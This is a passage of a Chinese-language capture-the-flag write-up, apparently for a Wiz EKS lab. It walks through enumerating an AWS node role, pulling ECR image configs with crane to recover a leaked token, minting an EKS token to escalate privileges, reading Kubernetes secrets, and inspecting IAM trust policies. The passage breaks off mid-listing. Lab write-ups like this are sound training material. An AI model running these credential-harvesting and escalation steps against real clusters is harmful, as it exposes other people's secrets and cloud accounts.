<h4 id="3-2-执行命令查看角色信息"><a href="#3-2-执行命令查看角色信息" class="headerlink" title="3.2 执行命令查看角色信息"></a>3.2 执行命令查看角色信息</h4><p>查看账户信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws sts get-caller-identity</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;UserId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AROA2AVYNEVMQ3Z5GHZHS:i-0cb922c6673973282&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Account&quot;</span><span class="punctuation">:</span> <span class="string">&quot;688655246681&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Arn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>arn:</strong> 表示Amazon资源名称的前缀。</li>
<li><strong>aws:</strong> 表示ARN的命名空间，指示这是AWS资源。</li>
<li><strong>sts:</strong> 指示AWS Security Token Service (STS)。</li>
<li><strong>688655246681:</strong> AWS账户号码，唯一标识AWS账户。</li>
<li><strong>assumed-role:</strong> 角色扮演（Assume Role）操作的标识符。</li>
<li><strong>eks-challenge-cluster-nodegroup-NodeInstanceRole:</strong> 扮演的IAM角色的名称。在这个例子中，它是<code>eks-challenge-cluster-nodegroup-NodeInstanceRole</code>。</li>
<li><strong>i-0cb922c6673973282:</strong> 与角色相关联的实例的ID。在这个例子中，它是<code>i-0cb922c6673973282</code>。</li>
</ul>
<p>查看角色权限</p>
<p>使用github脚本查看，请见参考文献</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">2023-12-28 16:27:00,284 - 37842 - [INFO] -- Account ARN : arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282</span><br><span class="line">2023-12-28 16:27:00,284 - 37842 - [INFO] -- Account Id  : 688655246681</span><br><span class="line">2023-12-28 16:27:00,284 - 37842 - [INFO] -- Account Path: assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282</span><br><span class="line">2023-12-28 16:27:02,885 - 37842 - [INFO] Attempting common-service describe / list brute force.</span><br><span class="line">2023-12-28 16:27:05,495 - 37842 - [INFO] -- ecr.get_authorization_token() worked!</span><br><span class="line">2023-12-28 16:27:05,751 - 37842 - [INFO] -- ecr.describe_repositories() worked!</span><br><span class="line">2023-12-28 16:27:23,679 - 37842 - [INFO] -- dynamodb.describe_endpoints() worked!</span><br><span class="line">2023-12-28 16:27:31,811 - 37842 - [INFO] -- sts.get_caller_identity() worked!</span><br></pre></td></tr></table></figure>

<p>查看服务器地区和仓库名</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get pods -o yaml|grep image</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">image:</span> <span class="number">688655246681.</span><span class="string">dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01</span></span><br><span class="line"> <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line"> <span class="attr">image:</span> <span class="string">sha256:575a75bed1bdcf83fba40e82c30a7eec7bc758645830332a38cef238cd4cf0f3</span></span><br><span class="line"> <span class="attr">imageID:</span> <span class="number">688655246681.</span><span class="string">dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01</span></span><br></pre></td></tr></table></figure>

<p>看到地区为us-west-1，仓库名为central_repo-aaf4a7c</p>
<p>查看镜像信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws ecr describe-repositories --repository-names central_repo-aaf4a7c --region us-west-1</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;repositories&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;repositoryArn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:ecr:us-west-1:688655246681:repository/central_repo-aaf4a7c&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;registryId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;688655246681&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;repositoryName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;central_repo-aaf4a7c&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;repositoryUri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;createdAt&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2023-11-01T13:31:27+00:00&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;imageTagMutability&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MUTABLE&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;imageScanningConfiguration&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;scanOnPush&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;encryptionConfiguration&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;encryptionType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AES256&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="3-3-crane登陆并对镜像进行解析"><a href="#3-3-crane登陆并对镜像进行解析" class="headerlink" title="3.3 crane登陆并对镜像进行解析"></a>3.3 crane登陆并对镜像进行解析</h4><p>获取登陆token，通过docker使用token进行登陆</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws ecr get-login-password|crane auth login 688655246681.dkr.ecr.us-west-1.amazonaws.com -u AWS --password-stdin</span><br></pre></td></tr></table></figure>

<p>通过crane进行远程分析</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01</span><br></pre></td></tr></table></figure>

<p>在记录中获取到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;architecture&quot;:&quot;amd64&quot;,&quot;config&quot;:&#123;&quot;Env&quot;:[&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;],&quot;Cmd&quot;:[&quot;/bin/sleep&quot;,&quot;3133337&quot;],&quot;ArgsEscaped&quot;:true,&quot;OnBuild&quot;:null&#125;,&quot;created&quot;:&quot;2023-11-01T13:32:07.782534085Z&quot;,&quot;history&quot;:[&#123;&quot;created&quot;:&quot;2023-07-18T23:19:33.538571854Z&quot;,&quot;created_by&quot;:&quot;/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / &quot;&#125;,&#123;&quot;created&quot;:&quot;2023-07-18T23:19:33.655005962Z&quot;,&quot;created_by&quot;:&quot;/bin/sh -c #(nop)  CMD [\&quot;sh\&quot;]&quot;,&quot;empty_layer&quot;:true&#125;,&#123;&quot;created&quot;:&quot;2023-11-01T13:32:07.782534085Z&quot;,&quot;created_by&quot;:&quot;RUN sh -c #ARTIFACTORY_USERNAME=challenge@eksclustergames.com ARTIFACTORY_TOKEN=wiz_eks_challenge&#123;the_history_of_container_images_could_reveal_the_secrets_to_the_future&#125; ARTIFACTORY_REPO=base_repo /bin/sh -c pip install setuptools --index-url intrepo.eksclustergames.com # buildkit # buildkit&quot;,&quot;comment&quot;:&quot;buildkit.dockerfile.v0&quot;&#125;,&#123;&quot;created&quot;:&quot;2023-11-01T13:32:07.782534085Z&quot;,&quot;created_by&quot;:&quot;CMD [\&quot;/bin/sleep\&quot; \&quot;3133337\&quot;]&quot;,&quot;comment&quot;:&quot;buildkit.dockerfile.v0&quot;,&quot;empty_layer&quot;:true&#125;],&quot;os&quot;:&quot;linux&quot;,&quot;rootfs&quot;:&#123;&quot;type&quot;:&quot;layers&quot;,&quot;diff_ids&quot;:[&quot;sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f&quot;,&quot;sha256:9057b2e37673dc3d5c78e0c3c5c39d5d0a4cf5b47663a4f50f5c6d56d8fd6ad5&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4-第四部分"><a href="#4-第四部分" class="headerlink" title="4. 第四部分"></a>4. 第四部分</h2><p>在此任务中，您已获取节点的服务帐户凭据。为了便于将来参考，您可以在 pod 中方便地访问这些凭据。</p>
<p>有趣的事实：此挑战中突出显示的错误配置很常见，并且相同的技术可以应用于任何不强制实施 IMDSv2 跃点限制的 EKS 集群。</p>
<h3 id="Pod-Break"><a href="#Pod-Break" class="headerlink" title="Pod Break"></a>Pod Break</h3><p>You’re inside a vulnerable pod on an EKS cluster. Your pod’s service-account has no permissions. Can you navigate your way to access the EKS Node’s privileged service-account?</p>
<p>我们现在的node没有任何权限，我想要的是能够访问secrets和serviceaccount的权限，该如何进行提权呢。aws允许IAM用户创建临时访问凭据对集群进行访问，我们可以利用这一点来提升权限。</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/secrets.png" alt="secrets"></p>
<h4 id="4-1-查看我们的权限"><a href="#4-1-查看我们的权限" class="headerlink" title="4.1 查看我们的权限"></a>4.1 查看我们的权限</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl auth can-i --list   </span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231228194404583.png" alt="image-20231228194404583"></p>
<p>什么权限都没有</p>
<h4 id="4-2-更新token"><a href="#4-2-更新token" class="headerlink" title="4.2 更新token"></a>4.2 更新token</h4><p>首先要知道我们在集群中是什么角色</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws sts get-caller-identity</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;UserId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AROA2AVYNEVMQ3Z5GHZHS:i-0cb922c6673973282&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Account&quot;</span><span class="punctuation">:</span> <span class="string">&quot;688655246681&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Arn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>我们主要想知道的是集群名称：eks-challenge-cluster</p>
<p>接下来查看token</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws eks get-token --cluster-name eks-challenge-cluster --region us-west-1</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;kind&quot;:</span> <span class="string">&quot;ExecCredential&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;apiVersion&quot;:</span> <span class="string">&quot;client.authentication.k8s.io/v1beta1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;spec&quot;:</span> &#123;&#125;,</span><br><span class="line">    <span class="attr">&quot;status&quot;:</span> &#123;</span><br><span class="line">        <span class="attr">&quot;expirationTimestamp&quot;:</span> <span class="string">&quot;2023-12-28T11:40:29Z&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;token&quot;:</span> <span class="string">&quot;k8s-aws-v1.aHR0cHM6Ly9zdHMudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vP0FjdGlvbj1HZXRDYWxsZXJJZGVudGl0eSZWZXJzaW9uPTIwMTEtMDYtMTUmWC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BU0lBMkFWWU5FVk1ZVzdYTkhPNyUyRjIwMjMxMjI4JTJGdXMtd2VzdC0xJTJGc3RzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyMzEyMjhUMTEyNjI5WiZYLUFtei1FeHBpcmVzPTYwJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCUzQngtazhzLWF3cy1pZCZYLUFtei1TZWN1cml0eS1Ub2tlbj1Gd29HWlhJdllYZHpFRVVhREl0d0s1NzlDYkd1RGQ0Z21TSzNBYnVZeHZZU1JBRGthUG01a0h5WW5IYyUyQjVUWVhLNjBpaVZwb3hHSUo4NTZOalRHZXBhUHVIVEtYTE9aZkN6TzBlMHglMkYzZ1RPM1loR0RNWnp4TWNpVGJRS2V4T05OJTJGd1VOR2ZVSGQ0aEV1TCUyRk9GNCUyRjh0Qkd1MVl1bjdGVCUyRkN4JTJCY0NQZFFDUW02YlZUREU1Zjc5Y0tRSUNBNTdkbUluQ014MmhNZUpiTEQyM3pNVmtGWVBRZDJwWTRWQkF6d2o2NkRNNTBOS1J4RVJpMzlRYXgyYTVla2dsa1VJWFBUNUkyUyUyQktndWhpblVKeUVMYnYyMkVXdWpTaTVzTFdzQmpJdHJCUTdzWjdGd2NMcTRiQUc3Z0o1c05vZ2FLdWpPcTk0ZTZ5MmRaOW9ESlZJZ3FkeDlqR2JtNFZBZ0NobSZYLUFtei1TaWduYXR1cmU9MmY0MjBlY2JkMjNlYmRmZGRlN2QxOGY3MWU4NWEzYjQ2NTllYzAxNTM5NWI1N2RhMjM2NDczOTYyOTVhYmE4Nw&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用token</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TOKEN1=$(aws  eks get-token --cluster-name eks-challenge-cluster --region us-west-1 | jq  -r .status.token)</span><br><span class="line">kubectl get pods --token=<span class="variable">$TOKEN1</span></span><br></pre></td></tr></table></figure>

<p>看一下我们现在的权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl auth can-i --list --token=<span class="variable">$TOKEN1</span></span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231228194208202.png" alt="image-20231228194208202"></p>
<p>发现已经可以查看serviceaccount和secrets了从而获取flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get secrets --token=<span class="variable">$TOKEN1</span> -o yaml</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">items:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line">  <span class="attr">data:</span></span><br><span class="line">    <span class="attr">flag:</span> <span class="string">d2l6X2Vrc19jaGFsbGVuZ2V7b25seV9hX3JlYWxfcHJvX2Nhbl9uYXZpZ2F0ZV9JTURTX3RvX0VLU19jb25ncmF0c30=</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">Secret</span></span><br><span class="line">  <span class="attr">metadata:</span></span><br><span class="line">    <span class="attr">creationTimestamp:</span> <span class="string">&quot;2023-11-01T12:27:57Z&quot;</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">node-flag</span></span><br><span class="line">    <span class="attr">namespace:</span> <span class="string">challenge4</span></span><br><span class="line">    <span class="attr">resourceVersion:</span> <span class="string">&quot;883574&quot;</span></span><br><span class="line">    <span class="attr">uid:</span> <span class="string">26461a29-ec72-40e1-adc7-99128ce664f7</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">Opaque</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">List</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">resourceVersion:</span> <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="5-第五部分"><a href="#5-第五部分" class="headerlink" title="5. 第五部分"></a>5. 第五部分</h2><h3 id="Container-Secrets-Infrastructure"><a href="#Container-Secrets-Infrastructure" class="headerlink" title="Container Secrets Infrastructure"></a>Container Secrets Infrastructure</h3><p>You’ve successfully transitioned from a limited Service Account to a Node Service Account! Great job. Your next challenge is to move from the EKS to the AWS account. Can you acquire the AWS role of the <em>s3access-sa</em> service account, and get the flag?</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/5.png" alt="5"></p>
<h4 id="5-1-IAM策略"><a href="#5-1-IAM策略" class="headerlink" title="5.1 IAM策略"></a>5.1 IAM策略</h4><p>允许的动作：列出s3 bucket中的资源、获取特定s3 bucket中的资源</p>
<p>允许的资源：arn:aws:s3:::challenge-flag-bucket-3ff1ae2、arn:aws:s3:::challenge-flag-bucket-3ff1ae2&#x2F;flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;Policy&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;Statement&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;Action&quot;</span>: [</span><br><span class="line">                    <span class="string">&quot;s3:GetObject&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;s3:ListBucket&quot;</span></span><br><span class="line">                ],</span><br><span class="line">                <span class="string">&quot;Effect&quot;</span>: <span class="string">&quot;Allow&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Resource&quot;</span>: [</span><br><span class="line">                    <span class="string">&quot;arn:aws:s3:::challenge-flag-bucket-3ff1ae2&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag&quot;</span></span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&quot;Version&quot;</span>: <span class="string">&quot;2012-10-17&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="5-2-Trust策略"><a href="#5-2-Trust策略" class="headerlink" title="5.2 Trust策略"></a>5.2 Trust策略</h4><p>允许使用web身份验证：允许了k8s中使用IAM角色进行web身份验证</p>
<p>指定了生效条件：</p>
<p>OIDC提供程序中的JWT的audience字段必须为sts.amazonaws.com</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;Version&quot;</span>: <span class="string">&quot;2012-10-17&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Statement&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;Effect&quot;</span>: <span class="string">&quot;Allow&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Principal&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;Federated&quot;</span>: <span class="string">&quot;arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;Action&quot;</span>: <span class="string">&quot;sts:AssumeRoleWithWebIdentity&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Condition&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;StringEquals&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589:aud&quot;</span>: <span class="string">&quot;sts.amazonaws.com&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="5-3-Permission策略"><a href="#5-3-Permission策略" class="headerlink" title="5.3 Permission策略"></a>5.3 Permission策略</h4><p>secrets：允许列出和获取</p>
<p>serviceaccounts：允许列出和获取</p>
<p>pods：允许列出和获取</p>
<p>serviceaccounts&#x2F;token：允许创建</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;secrets&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;get&quot;</span>,</span><br><span class="line">        <span class="string">&quot;list&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;serviceaccounts&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;get&quot;</span>,</span><br><span class="line">        <span class="string">&quot;list&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;pods&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;get&quot;</span>,</span><br><span class="line">        <span class="string">&quot;list&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;serviceaccounts/token&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;create&quot;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="5-4-查看我们的权限"><a href="#5-4-查看我们的权限" class="headerlink" title="5.4 查看我们的权限"></a>5.4 查看我们的权限</h4><p>有一个值得注意的点：我们只能为debug-sa创建token，这里也是一个突破口</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl auth can-i --list</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231228203431104.png" alt="image-20231228203431104"></p>
<h4 id="5-5-查看集群中可用的信息"><a href="#5-5-查看集群中可用的信息" class="headerlink" title="5.5 查看集群中可用的信息"></a>5.5 查看集群中可用的信息</h4><p>查看pod</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231228203726812.png" alt="image-20231228203726812"></p>
<p>查看serviceaccount</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231228203746071.png" alt="image-20231228203746071"></p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">items:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">  <span class="attr">metadata:</span></span><br><span class="line">    <span class="attr">annotations:</span></span><br><span class="line">      <span class="attr">description:</span> <span class="string">This</span> <span class="string">is</span> <span class="string">a</span> <span class="string">dummy</span> <span class="string">service</span> <span class="string">account</span> <span class="string">with</span> <span class="string">empty</span> <span class="string">policy</span> <span class="string">attached</span></span><br><span class="line">      <span class="attr">eks.amazonaws.com/role-arn:</span> <span class="string">arn:aws:iam::688655246681:role/challengeTestRole-fc9d18e</span></span><br><span class="line">    <span class="attr">creationTimestamp:</span> <span class="string">&quot;2023-10-31T20:07:37Z&quot;</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">debug-sa</span></span><br><span class="line">    <span class="attr">namespace:</span> <span class="string">challenge5</span></span><br><span class="line">    <span class="attr">resourceVersion:</span> <span class="string">&quot;671929&quot;</span></span><br><span class="line">    <span class="attr">uid:</span> <span class="string">6cb6024a-c4da-47a9-9050-59c8c7079904</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">  <span class="attr">metadata:</span></span><br><span class="line">    <span class="attr">creationTimestamp:</span> <span class="string">&quot;2023-10-31T20:07:11Z&quot;</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">default</span></span><br><span class="line">    <span class="attr">namespace:</span> <span class="string">challenge5</span></span><br><span class="line">    <span class="attr">resourceVersion:</span> <span class="string">&quot;671804&quot;</span></span><br><span class="line">    <span class="attr">uid:</span> <span class="string">77bd3db6-3642-40d5-b8c1-14fa1b0cba8c</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">  <span class="attr">metadata:</span></span><br><span class="line">    <span class="attr">annotations:</span></span><br><span class="line">      <span 